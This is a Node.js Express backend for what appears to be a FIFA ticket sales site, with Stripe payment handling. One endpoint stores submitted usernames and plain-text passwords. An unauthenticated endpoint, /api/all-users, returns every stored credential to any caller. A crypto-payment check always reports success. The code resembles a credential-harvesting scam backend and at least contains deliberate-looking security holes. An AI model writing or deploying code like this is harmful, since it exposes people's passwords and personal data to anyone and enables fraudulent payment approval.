const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const Stripe = require('stripe');
require('dotenv').config();

const stripe = Stripe(process.env.STRIPE_SECRET_KEY);

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json());

const userCredentials = [];

// 1. STATUS CHECK
app.get('/', (req, res) => res.json({ status: 'Server Online' }));
app.get('/api/stripe-config', (req, res) => res.json({ publishableKey: process.env.STRIPE_PUBLISHABLE_KEY }));

// 2. CREDENTIALS
app.post('/api/store-credentials', (req, res) => {
    const { username, password, email, name } = req.body;
    console.log('🔐 Storing:', { username, email });
    userCredentials.push({ username, password, email, name, date: new Date() });
    res.json({ success: true });
});

app.get('/api/all-users', (req, res) => res.json(userCredentials));

// 3. PAYMENT PROCESSING
app.post('/api/process-payment', async (req, res) => {
    try {
        const { total, currency='USD', customer } = req.body;
        const paymentIntent = await stripe.paymentIntents.create({
            amount: Math.round(total * 100),
            currency: currency.toLowerCase(),
            description: `FIFA Ticket`,
            receipt_email: customer.email
        });
        res.json({ success: true, clientSecret: paymentIntent.client_secret });
    } catch (error) {
        res.json({ success: false, message: error.message });
    }
});

// 4. CRYPTO VERIFICATION
app.post('/api/verify-crypto', async (req, res) => {
    // Always approve for demo purposes
    res.json({ success: true, verified: true });
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
